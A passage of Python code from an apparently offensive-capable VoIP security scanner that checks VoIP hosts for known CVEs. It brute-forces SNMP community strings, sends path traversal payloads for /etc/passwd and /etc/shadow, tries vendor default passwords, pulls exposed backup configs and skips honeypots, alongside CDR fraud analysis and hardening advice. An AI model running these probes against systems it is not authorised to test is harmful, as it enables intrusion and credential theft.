            safe(_path_traversal(ip,state,sess),"path_trav"),
            safe(_dir_listing(ip,state,sess),  "dir_list"),
            safe(_exposed_backup(ip,state,sess),"backup"),
            safe(_api_info_leak(ip,state,sess), "api_info"),
        )

    await asyncio.gather(*[_sem_probe(sem, mgmt_all, ip) for ip in state.live_ips])
    Con.ok("Phase 13 complete — management testing done")


def _build_snmp_get(community: str, oid_ints: List[int]) -> bytes:
    """Build raw SNMP v1 GetRequest packet without any external library."""
    def _ber_len(n: int) -> bytes:
        if n < 0x80:
            return bytes([n])
        elif n < 0x100:
            return b"\x81" + bytes([n])
        else:
            return b"\x82" + bytes([n >> 8, n & 0xff])

    def _ber_int(n: int) -> bytes:
        if n == 0:
            return b"\x02\x01\x00"
        parts = []
        while n:
            parts.insert(0, n & 0xff)
            n >>= 8
        if parts[0] & 0x80:
            parts.insert(0, 0)
        return b"\x02" + _ber_len(len(parts)) + bytes(parts)

    def _ber_oid(oids: List[int]) -> bytes:
        if len(oids) < 2:
            return b""
        body = bytes([oids[0]*40 + oids[1]])
        for v in oids[2:]:
            if v < 0x80:
                body += bytes([v])
            else:
                parts = []
                while v:
                    parts.insert(0, (v & 0x7f) | (0x80 if parts else 0))
                    v >>= 7
                parts[-1] &= 0x7f
                body += bytes(parts)
        return b"\x06" + _ber_len(len(body)) + body

    # VarBind: OID + NULL
    oid_bytes = _ber_oid(oid_ints)
    var_bind   = oid_bytes + b"\x05\x00"
    var_bind   = b"\x30" + _ber_len(len(var_bind)) + var_bind
    var_binds  = b"\x30" + _ber_len(len(var_bind)) + var_bind

    req_id     = _ber_int(random.randint(1, 0x7fffffff))
    err_status = b"\x02\x01\x00"
    err_index  = b"\x02\x01\x00"
    pdu_body   = req_id + err_status + err_index + var_binds
    pdu        = b"\xa0" + _ber_len(len(pdu_body)) + pdu_body

    comm_b     = community.encode()
    community_field = b"\x04" + _ber_len(len(comm_b)) + comm_b
    version    = b"\x02\x01\x00"  # v1
    msg_body   = version + community_field + pdu
    return b"\x30" + _ber_len(len(msg_body)) + msg_body


def _parse_snmp_string(resp: bytes) -> str:
    """Extract OCTET STRING value from SNMP response."""
    if not resp or len(resp) < 10:
        return ""
    # Look for OCTET STRING tag (0x04) in the response
    idx = resp.find(b"\x04")
    while idx != -1 and idx < len(resp)-2:
        length = resp[idx+1]
        if idx+2+length <= len(resp):
            val = resp[idx+2:idx+2+length]
            decoded = val.decode(errors="replace").strip()
            if len(decoded) > 3 and not decoded.startswith("\x00"):
                return decoded[:120]
        idx = resp.find(b"\x04", idx+1)
    return ""


async def _snmp_brute(ip,st):
    """True async SNMP brute using raw UDP packets — no subprocess."""
    # sysDescr OID: 1.3.6.1.2.1.1.1.0
    sysDescr_oid = [1,3,6,1,2,1,1,1,0]

    # Send all community probes in parallel batches
    async def _try_community(community: str) -> Tuple[str, str]:
        pkt = _build_snmp_get(community, sysDescr_oid)
        resp = await udp_xfer(ip, 161, pkt, timeout=2.0, retries=1)
        if resp and len(resp) > 10:
            # Check it's a GetResponse (0xa2)
            if b"\xa2" in resp[:20]:
                desc = _parse_snmp_string(resp)
                return community, desc
        return community, ""

    # Test all communities in parallel for maximum speed
    results = await asyncio.gather(
        *[_try_community(c) for c in SNMP_COMMUNITIES],
        return_exceptions=True,
    )
    for item in results:
        if isinstance(item, tuple):
            community, desc = item
            if desc:
                await st.finding(ip,"MISCONFIGURATION",
                    f"SNMP Community '{community}' Valid — sysDescr: {desc[:60]}","HIGH",
                    f"sysDescr: {desc}",f"udp://{ip}:161")
                return


async def _path_traversal(ip,st,sess):
    traversals = [
        "/admin/../../../etc/passwd",
        "/%2e%2e/%2e%2e/etc/passwd",
        "/admin/..%2F..%2Fetc%2Fpasswd",
        "/cgi-bin/../../../../etc/shadow",
        "/config?file=../../../../etc/passwd",
        "/download?name=../../../etc/passwd",
    ]
    combos = [(path, proto, port)
              for path in traversals
              for proto, port in [("http",80),("https",443),("http",8080)]]

    async def _probe(path, proto, port):
        c, b = await http_get(sess, f"{proto}://{ip}:{port}{path}", timeout=3)
        if c and FILE_READ_PATTERNS.search(b):
            return path, proto, port
        return None

    for fut in asyncio.as_completed([_probe(*c) for c in combos]):
        result = await fut
        if result:
            path, proto, port = result
            await st.finding(ip,"CVE-2020-3381","Path Traversal — /etc/passwd Readable",
                "CRITICAL",f"LFI confirmed via {path}",f"{proto}://{ip}:{port}{path}")
            return


async def _dir_listing(ip,st,sess):
    paths = ["/admin/","/config/","/logs/","/backup/","/recordings/"]
    results = await asyncio.gather(
        *[http_get(sess, f"http://{ip}{p}", timeout=3) for p in paths],
        return_exceptions=True)
    for path, res in zip(paths, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c==200 and re.search(r'Index of|<listing>|\bparent directory\b',b,re.I):
            await st.finding(ip,"INFO-DISCLOSURE",f"Directory Listing at {path}","MEDIUM",
                f"Directory listing exposed at http://{ip}{path}",f"http://{ip}{path}")
            return


async def _exposed_backup(ip,st,sess):
    _CRED_RE = re.compile(r'secret|password|username|passwd', re.I)
    combos = [(path, proto, port)
              for path in ["/backup.tar.gz","/asterisk.conf.bak",
                           "/sip.conf.bak","/freepbx.bak",
                           "/admin/download.php?file=sip.conf",
                           "/config.bak","/voip.bak"]
              for proto, port in [("http",80),("https",443)]]

    async def _probe(path, proto, port):
        c, b = await http_get(sess, f"{proto}://{ip}:{port}{path}", timeout=3)
        if c==200 and (len(b)>500 or _CRED_RE.search(b)):
            return path, proto, port
        return None

    for fut in asyncio.as_completed([_probe(*c) for c in combos]):
        result = await fut
        if result:
            path, proto, port = result
            await st.finding(ip,"EXPOSURE",f"Backup File Accessible: {path}","CRITICAL",
                "Backup file contains credentials/config",f"{proto}://{ip}:{port}{path}")
            return


async def _api_info_leak(ip,st,sess):
    paths = ["/api/v1/info","/api/info","/status","/health","/api/v1/system","/metrics"]
    _INFO_RE = re.compile(r'"(version|build|serial|mac|hostname|uptime)"', re.I)
    results = await asyncio.gather(
        *[http_get(sess, f"http://{ip}{p}", timeout=3) for p in paths],
        return_exceptions=True)
    for path, res in zip(paths, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c==200 and _INFO_RE.search(b):
            await st.finding(ip,"INFO-DISCLOSURE","API Info Endpoint Exposed","LOW",
                f"System info at http://{ip}{path}",f"http://{ip}{path}")
            return

# ══════════════════════════════════════════════════════════
# PHASE 14 — Vendor-Specific Deep Tests
# ══════════════════════════════════════════════════════════
async def phase14_vendor(state:State, sess, sem:asyncio.Semaphore):
    Con.phase("PHASE 14 │ VENDOR-SPECIFIC DEEP CVE EXPLOITATION")
    if not state.live_ips:
        Con.warn("No live hosts — skipping vendor phase"); return

    async def vendor_all(ip:str):
        if ip in state.honeypot_ips: return
        await asyncio.gather(
            safe(_v_cisco_cucm(ip,state,sess),      "cisco_cucm"),
            safe(_v_avaya_full(ip,state,sess),      "avaya"),
            safe(_v_grandstream_full(ip,state,sess),"grandstream"),
            safe(_v_polycom_full(ip,state,sess),    "polycom"),
            safe(_v_yealink_full(ip,state,sess),    "yealink"),
            safe(_v_freepbx_full(ip,state,sess),    "freepbx"),
            safe(_v_3cx_full(ip,state,sess),        "3cx"),
            safe(_v_elastix_full(ip,state,sess),    "elastix"),
            safe(_v_mitel_full(ip,state,sess),      "mitel"),
            safe(_v_kamailio_full(ip,state,sess),   "kamailio"),
            safe(_v_nec(ip,state,sess),             "nec"),
            safe(_v_panasonic(ip,state,sess),       "panasonic"),
            safe(_v_audiocodes_full(ip,state,sess), "audiocodes"),
            safe(_v_voipmonitor_full(ip,state,sess),"voipmonitor"),
            safe(_v_fanvil(ip,state,sess),          "fanvil"),
        )

    await asyncio.gather(*[_sem_probe(sem, vendor_all, ip) for ip in state.live_ips])
    Con.ok("Phase 14 complete — vendor-specific tests done")


async def _v_cisco_cucm(ip,st,sess):
    paths_cves = [
        ("/ccmadmin/showAdminPasswordPage.do","CVE-2021-1397"),
        ("/ccmadmin/platformConfigMenu.do","CVE-2022-20804"),
        ("/ccmadmin/uploadFile.do","CVE-2022-20812"),
        ("/ccmservice/","CVE-2022-31601"),
    ]
    _CISCO_RE = re.compile(r'cisco|cucm|callmanager', re.I)
    urls = [f"https://{ip}:8443{path}" for path, _ in paths_cves]
    urls.append(f"https://{ip}/CGI/Java/Serviceability?adapter=device.statistics.device")
    results = await asyncio.gather(*[http_get(sess, u, timeout=4) for u in urls],
                                   return_exceptions=True)
    for i, (url, res) in enumerate(zip(urls, results)):
        if isinstance(res, Exception): continue
        c, b = res
        if i < len(paths_cves):
            path, cve = paths_cves[i]
            if c and c not in (404,) and _CISCO_RE.search(b):
                await st.finding(ip,cve,CVE_DB.get(cve,("Cisco CUCM","HIGH"))[0],
                    CVE_DB.get(cve,("","HIGH"))[1],
                    f"Cisco CUCM path accessible at {path}",url)
                return
        else:
            if c==200 and re.search(r'cisco|phone|sep',b,re.I):
                await st.finding(ip,"CVE-2020-3161","Cisco IP Phone HTTP Interface","CRITICAL",
                    "Phone web service reachable — RCE on 7800/8800",f"https://{ip}/CGI/")


async def _v_avaya_full(ip,st,sess):
    entries = [
        (f"https://{ip}/WebManagement/","CVE-2021-22502","Avaya Aura RCE","CRITICAL"),
        (f"https://{ip}/one-x/","CVE-2020-7043","Avaya Session Manager XXE","HIGH"),
        (f"http://{ip}:8443/SessionManager/","CVE-2020-7043","Avaya SM XXE","HIGH"),
        (f"https://{ip}/avaya/","CVE-2018-15614","Avaya IP Office","CRITICAL"),
    ]
    _AVAYA_RE = re.compile(r'avaya|session.manager|one-x', re.I)
    results = await asyncio.gather(
        *[http_get(sess, url, timeout=4) for url, *_ in entries],
        return_exceptions=True)
    for (url,cve,title,sev), res in zip(entries, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c and _AVAYA_RE.search(b):
            await st.finding(ip,cve,title,sev,f"Avaya interface at {url}",url)
            return


async def _v_grandstream_full(ip,st,sess):
    entries = [
        (f"http://{ip}:8089/cgi-bin/api.values.get","CVE-2022-37397"),
        (f"http://{ip}:8089/cgi-bin/api-sys_performance.cgi","CVE-2020-5736"),
        (f"http://{ip}:80/cgi-bin/ConfigManApp.com","CVE-2019-10660"),
    ]
    _GS_RE   = re.compile(r'grandstream|ucm|GVC|GXP', re.I)
    _RESP_RE = re.compile(r'response|result|value|system', re.I)
    results = await asyncio.gather(
        *[http_get(sess, url, timeout=4) for url, _ in entries],
        return_exceptions=True)
    for (url,cve), res in zip(entries, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c==200 and _GS_RE.search(b) and _RESP_RE.search(b):
            title,sev = CVE_DB.get(cve,("Grandstream Vuln","CRITICAL"))
            await st.finding(ip,cve,title,sev,"Grandstream API returns data without auth",url)


async def _v_polycom_full(ip,st,sess):
    for path,creds,cve in [
        ("/form-submit/Diagnostics/statistic",("Polycom","456"),"CVE-2019-9222"),
        ("/",("PlcmSpIp","PlcmSpIp"),"CVE-2018-9855"),
        ("/",("admin","456"),"CVE-2017-7486"),
    ]:
        c,b = await http_get(sess,f"http://{ip}{path}",auth=creds,timeout=5)
        if c==200 and re.search(r'polycom|realpresence',b,re.I):
            title,sev = CVE_DB.get(cve,("Polycom","HIGH"))
            await st.finding(ip,cve,title,sev,
                f"Accepted {creds[0]}:{creds[1]}",f"http://{ip}{path}")


async def _v_yealink_full(ip,st,sess):
    entries = [
        (f"https://{ip}/api/v1/accounts","CVE-2021-27561"),
        (f"http://{ip}:8080/api/v1/","CVE-2021-27562"),
    ]
    _YL_RE = re.compile(r'yealink|account', re.I)
    results = await asyncio.gather(
        *[http_get(sess, url, timeout=4) for url, _ in entries],
        return_exceptions=True)
    for (url,cve), res in zip(entries, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c==200 and _YL_RE.search(b):
            t,s = CVE_DB.get(cve,("Yealink","CRITICAL"))
            await st.finding(ip,cve,t,s,"Yealink API without auth",url)
            return
    c,b = await http_get(sess,f"http://{ip}/",auth=("admin","admin"),timeout=5)
    if c==200 and "yealink" in b.lower() \
            and re.search(r'(logout|dashboard|settings|config)',b,re.I):
        await st.finding(ip,"CVE-2021-21224","Yealink Default admin:admin","HIGH",
            "Accepted admin:admin — logged in to Yealink phone",f"http://{ip}/")


async def _v_freepbx_full(ip,st,sess):
    c0,b0 = await http_get(sess,f"http://{ip}/admin/",timeout=4)
    if not (c0 and re.search(r'freepbx|sangoma',b0,re.I)):
        return
    entries = [
        ("/admin/ajax.php?module=framework&command=checkDependencies","CVE-2022-26272"),
        ("/admin/ajax.php?module=userman&command=getAll","CVE-2020-36166"),
        ("/admin/config.php?display=phonebook&view=default","CVE-2023-49786"),
        ("/admin/modules.php","CVE-2019-11334"),
    ]
    _FPBX_OK  = re.compile(r'json|result|success|module', re.I)
    _FPBX_BAD = re.compile(r'login|password', re.I)
    results = await asyncio.gather(
        *[http_get(sess, f"http://{ip}{path}", timeout=4) for path, _ in entries],
        return_exceptions=True)
    for (path,cve), res in zip(entries, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c==200 and _FPBX_OK.search(b) and not _FPBX_BAD.search(b):
            t,s = CVE_DB.get(cve,("FreePBX RCE","CRITICAL"))
            await st.finding(ip,cve,t,s,"FreePBX endpoint returns data without auth",
                f"http://{ip}{path}")
            return


async def _v_3cx_full(ip,st,sess):
    entries = [
        (f"http://{ip}:5000/webclient","CVE-2021-26260"),
        (f"https://{ip}:5001/api/v1/status","CVE-2023-29059"),
        (f"http://{ip}:5000/api/v1/status","CVE-2023-29059"),
    ]
    results = await asyncio.gather(
        *[http_get(sess, url, timeout=4) for url, _ in entries],
        return_exceptions=True)
    for (url,cve), res in zip(entries, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c==200 and re.search(r'3cx|phonesystem',b,re.I):
            t,s = CVE_DB.get(cve,("3CX","CRITICAL"))
            await st.finding(ip,cve,t,s,"3CX detected — verify auth bypass",url)
            return


async def _v_elastix_full(ip,st,sess):
    entries = [
        ("/vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&module=Accounts&action=","CVE-2012-4869"),
        ("/modules/admin/index.php","CVE-2012-1233"),
    ]
    results = await asyncio.gather(
        *[http_get(sess, f"https://{ip}{path}", timeout=4) for path, _ in entries],
        return_exceptions=True)
    for (path,cve), res in zip(entries, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c and FILE_READ_PATTERNS.search(b):
            t,s = CVE_DB.get(cve,("Elastix","CRITICAL"))
            await st.finding(ip,cve,t+" — LFI Confirmed",s,
                "File content confirmed in response",f"https://{ip}{path}")
            return
        elif c and re.search(r'elastix|issabel',b,re.I):
            t,s = CVE_DB.get(cve,("Elastix","CRITICAL"))
            await st.finding(ip,cve,t+" (Detected)",
                "HIGH","Elastix panel accessible — manual verification recommended",
                f"https://{ip}{path}")
            return


async def _v_mitel_full(ip,st,sess):
    entries = [
        ("/aastra/","CVE-2022-29499","CRITICAL"),
        ("/micollab/client/login","CVE-2021-32077","HIGH"),
        ("/micontact/","CVE-2019-16922","HIGH"),
    ]
    _MITEL_RE = re.compile(r'mitel|mivoice|micollab|aastra', re.I)
    results = await asyncio.gather(
        *[http_get(sess, f"https://{ip}{path}", timeout=4) for path, *_ in entries],
        return_exceptions=True)
    for (path,cve,sev), res in zip(entries, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c and _MITEL_RE.search(b):
            t,_ = CVE_DB.get(cve,("Mitel","CRITICAL"))
            await st.finding(ip,cve,t,sev,f"Mitel at https://{ip}{path}",
                f"https://{ip}{path}")
            return


async def _v_kamailio_full(ip,st,sess):
    entries = [
        (f"http://{ip}:8080/mi","CVE-2022-44877"),
        (f"http://{ip}:8000/RPC2","CVE-2021-25956"),
        (f"http://{ip}:8888/mi","CVE-2022-44877"),
    ]
    _KAM_PAYLOAD = '{"jsonrpc":"2.0","method":"core.info","id":1}'
    _KAM_RE = re.compile(r'kamailio|opensips|version', re.I)
    results = await asyncio.gather(
        *[http_get(sess, url, data=_KAM_PAYLOAD, headers={"Content-Type":"application/json"},
                   timeout=4) for url, _ in entries],
        return_exceptions=True)
    for (url,cve), res in zip(entries, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c==200 and re.search(r'"id"\s*:\s*1',b) and _KAM_RE.search(b):
            t,s = CVE_DB.get(cve,("Kamailio MI","CRITICAL"))
            await st.finding(ip,cve,t,s,"MI API responded to core.info without auth",url)
            return


async def _v_nec(ip,st,sess):
    paths = ["/nec/","/sv9100/","/univerge/"]
    _NEC_RE = re.compile(r'nec|sv9100|univerge|sv8100', re.I)
    results = await asyncio.gather(
        *[http_get(sess, f"https://{ip}{p}", timeout=4) for p in paths],
        return_exceptions=True)
    for path, res in zip(paths, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c and _NEC_RE.search(b):
            await st.finding(ip,"MISCONFIGURATION","NEC SV9100/SV8100 Interface Detected","MEDIUM",
                f"NEC PBX at https://{ip}{path}",f"https://{ip}{path}")
            return


async def _v_panasonic(ip,st,sess):
    paths = ["/kx-ns/","/panasonic/","/kx-hts/"]
    _PAN_RE = re.compile(r'panasonic|kx-ns|kx-hts', re.I)
    results = await asyncio.gather(
        *[http_get(sess, f"http://{ip}{p}", timeout=4) for p in paths],
        return_exceptions=True)
    for path, res in zip(paths, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c and _PAN_RE.search(b):
            await st.finding(ip,"MISCONFIGURATION","Panasonic KX-NS/HTS Detected","MEDIUM",
                f"Panasonic PBX at http://{ip}{path}",f"http://{ip}{path}")
            return


async def _v_audiocodes_full(ip,st,sess):
    for path,cve in [
        ("/inifile/","CVE-2019-9202"),
        ("/cgi-bin/StatusPage.cgi","CVE-2018-17554"),
        ("/cgi-bin/manage","CVE-2019-9202"),
    ]:
        c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
        if c==200 and re.search(r'audiocodes|mediapack|mediant|gateway',b,re.I):
            t,s = CVE_DB.get(cve,("AudioCodes","HIGH"))
            await st.finding(ip,cve,t,s,f"AudioCodes at http://{ip}{path}",
                f"http://{ip}{path}")
            return


async def _v_voipmonitor_full(ip,st,sess):
    ports = [80,443,8080]
    urls  = [(80,"http"),(443,"https"),(8080,"http")]
    results = await asyncio.gather(
        *[http_get(sess, f"{proto}://{ip}:{port}/index.php", timeout=4)
          for port, proto in urls],
        return_exceptions=True)
    for (port, proto), res in zip(urls, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c and "VoIPmonitor" in b:
            c2,b2 = await http_get(sess,
                f"{proto}://{ip}:{port}/cdrproxy.php?host=127.0.0.1",timeout=4)
            if c2==200 and re.search(r'(cdr|proxy|response|result)',b2,re.I):
                await st.finding(ip,"CVE-2021-30461-B","VoIPmonitor cdrproxy SSRF confirmed",
                    "CRITICAL","cdrproxy.php fetches internal hosts without auth",
                    f"{proto}://{ip}:{port}/cdrproxy.php")
            return


async def _v_fanvil(ip,st,sess):
    c,b = await http_get(sess,f"http://{ip}/",auth=("admin","admin"),timeout=5)
    if c==200 and re.search(r'fanvil',b,re.I) \
            and re.search(r'(logout|settings|config|panel)',b,re.I):
        await st.finding(ip,"CREDENTIAL","Fanvil Phone Default admin:admin","HIGH",
            "Fanvil IP phone accepted default credentials",f"http://{ip}/")

# ══════════════════════════════════════════════════════════
# PHASE 15 — CDR Fraud Analysis
# ══════════════════════════════════════════════════════════
def phase15_cdr(cdr_file:str, rd:Path):
    Con.phase("PHASE 15 │ CDR FRAUD · TOLL FRAUD · ANOMALY DETECTION")
    out = rd/"fraud_analysis.txt"
    if not Path(cdr_file).exists():
        Con.warn(f"CDR file not found: {cdr_file}")
        out.write_text("CDR file not provided or not found.\n")
        return

    country_stats: Dict[str,Dict[str,dict]] = defaultdict(
        lambda: defaultdict(lambda:{"calls":0,"duration":0,"dests":set(),"sources":set()}))
    total = 0

    def _cc(num:str) -> Optional[str]:
        if num.startswith("+"):
            for l in (3,2,1):
                if len(num)>l: return num[:l+1]
        elif num.startswith("011") and len(num)>5:
            return "+"+num[3:6]
        return None

    try:
        with open(cdr_file,newline="",encoding="utf-8",errors="replace") as f:
            reader = csv.DictReader(f)
            for row in reader:
                total += 1
                calldate = (row.get("calldate") or row.get("date") or
                            row.get("start_time",""))[:10]
                dst = (row.get("dst_number") or row.get("dst") or row.get("destination",""))
                src = (row.get("src") or row.get("source") or row.get("clid",""))
                try: dur=int(row.get("duration_seconds") or row.get("duration") or
                             row.get("billsec",0) or 0)
                except: dur=0
                if not dst or not calldate: continue
                cc = _cc(dst)
                if not cc: continue
                s = country_stats[cc][calldate]
                s["calls"]+=1; s["duration"]+=dur//60
                s["dests"].add(dst); s["sources"].add(src)
    except Exception as e:
        Con.err(f"CDR error: {e}")

    flagged,ok_flag = [],[]
    for cc,days in country_stats.items():
        for day,s in days.items():
            risk = (s["calls"]/VOLUME_THRESH)+(s["duration"]/DURATION_THRESH)
            rec  = {**s,"cc":cc,"day":day,
                    "ud":len(s["dests"]),"us":len(s["sources"]),"risk":round(risk,2)}
            if cc in APPROVED_CC:
                if s["calls"]>=VOLUME_THRESH*3 or s["duration"]>=DURATION_THRESH*3:
                    ok_flag.append(rec)
            else:
                if s["calls"]>=VOLUME_THRESH or s["duration"]>=DURATION_THRESH:
                    flagged.append(rec)

    flagged.sort(key=lambda x:x["risk"],reverse=True)
    loss = sum(r["duration"]*0.15 for r in flagged)

    sep = "═"*72
    lines = [sep,"CDR FRAUD ANALYSIS REPORT",sep,
             f"Records processed : {total}",
             f"Flagged records   : {len(flagged)}",
             f"Estimated loss    : ${loss:.2f}","",
             "UNAPPROVED HIGH-RISK",sep,
             f"{'CC':<12}{'Date':<13}{'Calls':<8}{'Min':<10}{'Dests':<8}{'Risk':<8}Level","─"*72]
    for r in flagged:
        lvl = "CRITICAL" if r["risk"]>2 else "HIGH"
        lines.append(f"{r['cc']:<12}{r['day']:<13}{r['calls']:<8}{r['duration']:<10}"
                     f"{r['ud']:<8}{r['risk']:<8.2f}{lvl}")
    out.write_text("\n".join(lines),encoding="utf-8")
    Con.ok(f"Phase 15 complete — {len(flagged)} flagged, est. loss ${loss:.2f}")

# ══════════════════════════════════════════════════════════
# PHASE 16 — Reporting
# ══════════════════════════════════════════════════════════
HARDENING_CONF = """\
╔══════════════════════════════════════════════════════╗
║   VOIP HARDENING CONFIGURATION v7.0                 ║
╚══════════════════════════════════════════════════════╝

━━━ Asterisk sip.conf / pjsip.conf ━━━━━━━━━━━━━━━━━━
useragent=PBX
allowoverlap=no
allowsubscribe=no
allowtransfer=no
authenticate_invite=yes
alwaysauthreject=yes
directmedia=no
tlsenable=yes
tlscipher=ECDHE-RSA-AES256-GCM-SHA384
minexpiry=60
maxexpiry=300

━━━ fail2ban ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
maxretry=3  bantime=3600  findtime=300  (port 5060/5061)

━━━ iptables rate limit ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
iptables -A INPUT -p udp --dport 5060 \\
  -m limit --limit 50/s --limit-burst 100 -j ACCEPT
iptables -A INPUT -p udp --dport 5060 -j DROP

━━━ SIP Security Hardening ━━━━━━━━━━━━━━━━━━━━━━━━━
1.  TLS 1.2+ only (disable TLS 1.0/1.1)
2.  Mandatory SRTP AES-256-GCM for all media
3.  SHA-256 Digest + qop=auth-int (RFC 7616)
4.  Disable REGISTER from untrusted networks
5.  STIR/SHAKEN (RFC 8226) for caller-ID integrity
6.  AMI/ARI restricted to 127.0.0.1 only
7.  VoIP VLAN isolation from corporate network
8.  SNMP v3 AuthPriv — disable v1/v2c
9.  MFA on all admin web interfaces
10. Block SIP methods: SUBSCRIBE NOTIFY REFER PRACK
11. IAX2 HMAC-MD5 required — no anonymous trunks
12. MGCP on separate management VLAN
13. TFTP server restricted to provisioning VLAN
14. Phone firmware auto-update with signature check
15. Centralised logging: ELK/Splunk with SIP anomaly
"""


def phase16_report(state:State, input_file:str, rd:Path):
    Con.phase("PHASE 16 │ EXECUTIVE SUMMARY · HTML REPORT · HARDENING")
    rd.mkdir(parents=True,exist_ok=True)
    (rd/"hardening_config.txt").write_text(HARDENING_CONF,encoding="utf-8")

    by_sev:Dict[str,int] = defaultdict(int)
    for f in state.cve_findings: by_sev[f["severity"]]+=1

    total       = len(state.cve_findings)
    critical    = by_sev.get("CRITICAL",0)
    high        = by_sev.get("HIGH",0)
    medium      = by_sev.get("MEDIUM",0)
    low         = sum(by_sev.get(s,0) for s in ("LOW","INFO","INFO-DISCLOSURE",
                                                   "FUZZING","EXPOSURE"))
    elapsed     = time.monotonic()-state.scan_start
    risk_level  = ("CRITICAL — IMMEDIATE ACTION REQUIRED" if critical else
                   "HIGH — Urgent Remediation Needed"     if high else
                   "MEDIUM — Plan for Next Sprint"        if medium else
                   "LOW / Informational")

    try: n_targets = sum(1 for _ in open(input_file)) if Path(input_file).exists() else 0
    except: n_targets = 0

    summary = f"""
╔{"═"*72}╗
║{"ENTERPRISE VoIP SECURITY ASSESSMENT — EXECUTIVE SUMMARY":^72}║
║{"Framework v"+VERSION+" │ "+datetime.now().strftime("%Y-%m-%d %H:%M:%S"):^72}║
╚{"═"*72}╝

SCAN METRICS
{"═"*72}
  Targets provided        : {n_targets}
  Live hosts discovered   : {len(state.live_ips)}
  Honeypots excluded      : {len(state.honeypot_ips)}
  IAX2 hosts              : {len(state.iax2_hosts)}
  MGCP hosts              : {len(state.mgcp_hosts)}
  SCCP hosts              : {len(state.sccp_hosts)}
  H.323 hosts             : {len(state.h323_hosts)}
  Scan duration           : {elapsed:.0f} seconds

FINDINGS SUMMARY
{"═"*72}
  CRITICAL                : {critical}
  HIGH                    : {high}
  MEDIUM                  : {medium}
  LOW / INFO              : {low}
  Total findings          : {total}
  Valid extensions        : {len(state.valid_extensions)}
  Digest hashes captured  : {len(state.digest_hashes)}
  Provisioning issues     : {len(state.provision_urls)}

OVERALL RISK: {risk_level}

TOP CRITICAL/HIGH FINDINGS
{"═"*72}"""

    for f in (state.cve_findings)[:15]:
        if f["severity"] in ("CRITICAL","HIGH"):
            summary += f"\n  [{f['severity']}] {f['cve_id']} @ {f['ip']} — {f['title']}"

    summary += f"""

REMEDIATION TIMELINE
{"═"*72}
  IMMEDIATE (24h) : Patch CRITICAL CVEs · disable anon REGISTER · firewall
  SHORT-TERM (1w) : Fail2ban · TLS/SRTP · rotate default credentials · AMI restrict
  MEDIUM (30d)    : VLAN segment · monitoring/alerting · vendor firmware updates

GENERATED FILES
{"═"*72}
  results/cve_findings.json                — structured findings
  results/service_fingerprints.json        — fingerprint data
  results/verified_voip_vulnerabilities.txt — human-readable verified
  results/valid_extensions.txt             — discovered extensions
  results/digest_hashes.txt               — SIP digest challenges
  results/provisioning_findings.txt        — TFTP/HTTP prov issues
  results/fraud_analysis.txt               — CDR anomaly report
  results/hardening_config.txt             — remediation config
  results/voip_report.html                 — interactive HTML report
  results/honeypot_ips.txt                 — excluded honeypot hosts
"""
    (rd/"executive_summary.txt").write_text(summary,encoding="utf-8")
    print(summary)

    _write_html(state, rd, n_targets, risk_level, elapsed)
    Con.ok(f"Phase 16 complete — all reports written to {rd}/")


HTML_SEV = {
    "CRITICAL":"#dc2626","HIGH":"#ea580c","MEDIUM":"#d97706",
    "LOW":"#2563eb","INFO":"#6b7280","EXPOSURE":"#0891b2",
    "FUZZING":"#059669","INJECTION":"#b45309","AUTH-BYPASS":"#7c3aed",
    "CREDENTIAL":"#be123c","MISCONFIGURATION":"#0369a1","WEAK-CRYPTO":"#475569",
    "INFO-DISCLOSURE":"#6d28d9",
}

def _badge(sev:str)->str:
    c=HTML_SEV.get(sev,"#6b7280")
    return (f'<span style="background:{c};color:#fff;padding:2px 8px;'
            f'border-radius:4px;font-size:11px;font-weight:bold">'
            f'{html_lib.escape(sev)}</span>')


def _write_html(state:State, rd:Path, n_targets:int,
                risk_level:str, elapsed:float):
    by_sev:Dict[str,int] = defaultdict(int)
    for f in state.cve_findings: by_sev[f["severity"]]+=1

    stat_cards = ""
    for label,val,col_hex in [
        ("Targets",n_targets,"#0369a1"),("Live",len(state.live_ips),"#059669"),
        ("Honeypots",len(state.honeypot_ips),"#7c3aed"),
        ("CRITICAL",by_sev.get("CRITICAL",0),"#dc2626"),
        ("HIGH",by_sev.get("HIGH",0),"#ea580c"),
        ("MEDIUM",by_sev.get("MEDIUM",0),"#d97706"),
        ("Total Findings",len(state.cve_findings),"#7c3aed"),
        ("Extensions",len(state.valid_extensions),"#0891b2"),
        ("Hashes",len(state.digest_hashes),"#be123c"),
    ]:
        stat_cards += (f'<div style="background:{col_hex};color:#fff;padding:16px 20px;'
                       f'border-radius:10px;text-align:center;min-width:110px">'
                       f'<div style="font-size:28px;font-weight:bold">{val}</div>'
                       f'<div style="font-size:12px;margin-top:4px">{label}</div></div>\n')

    rows = ""
    for f in state.cve_findings:
        rows += (f"<tr><td>{html_lib.escape(f['ip'])}</td>"
                 f"<td><code>{html_lib.escape(f['cve_id'])}</code></td>"
                 f"<td>{html_lib.escape(f['title'])}</td>"
                 f"<td>{_badge(f['severity'])}</td>"
                 f"<td style='max-width:280px;word-break:break-word;font-size:12px'>"
                 f"{html_lib.escape(f['description'])}</td>"
                 f"<td><a href='{html_lib.escape(f['url'])}' style='color:#2563eb;font-size:11px'>"
                 f"{html_lib.escape(f['url'][:55])}</a></td>"
                 f"<td style='font-size:11px'>{html_lib.escape(f['ts'])}</td></tr>\n")

    fp_rows = ""
    for fp in state.fingerprints[:100]:
        fp_rows += (f"<tr><td>{html_lib.escape(fp.get('ip',''))}</td>"
                    f"<td>{html_lib.escape(fp.get('vendor',''))}</td>"
                    f"<td style='font-size:11px'>{html_lib.escape(fp.get('sip_banner','')[:80])}</td>"
                    f"<td style='font-size:11px'>{html_lib.escape(str(fp.get('ports_open',[])))}</td></tr>\n")

